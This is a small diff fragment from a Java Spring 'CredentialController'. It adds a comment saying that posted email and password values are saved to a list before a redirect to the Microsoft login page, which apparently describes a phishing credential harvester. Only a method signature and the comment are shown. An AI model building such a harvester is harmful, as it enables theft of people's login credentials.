@@ -31,6 +31,8 @@ public class CredentialController {
         return credentialsList;
     }
 
+
+    // Saves post data in list, redirect to MS Login page.
     @PostMapping("submitForm")
     public ResponseEntity<Void> credentialSubmit(@RequestParam String email, String password) {
 
